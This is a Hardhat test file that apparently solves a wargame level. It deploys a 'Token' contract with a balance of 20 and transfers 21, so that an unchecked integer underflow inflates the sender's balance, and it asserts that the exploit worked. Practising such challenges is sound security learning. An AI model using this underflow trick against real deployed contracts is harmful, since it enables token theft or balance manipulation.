const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Telephone", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();
    const INITIAL_BALANCE = 20;
    const TokenContract = await ethers.getContractFactory("Token");
    const Token = await TokenContract.deploy(INITIAL_BALANCE);
    await Token.deployed();

    return { Token, owner, otherAccount, INITIAL_BALANCE };
  }

  describe("Deployment", function () {
    it("Should Increase the Balance", async function () {
      const { Token, owner, otherAccount, INITIAL_BALANCE } = await loadFixture(
        deployOneYearLockFixture
      );
      const balance = await Token.balanceOf(owner.address);
      // It will cause the uint256 overflow -> which result in Increased Balance
      await Token.transfer(otherAccount.address, INITIAL_BALANCE + 1);
      const newBalance = await Token.balanceOf(owner.address);
      console.log(balance, newBalance);
      expect(balance).to.equal(INITIAL_BALANCE);
      expect(newBalance).to.greaterThan(INITIAL_BALANCE);
    });
  });
});
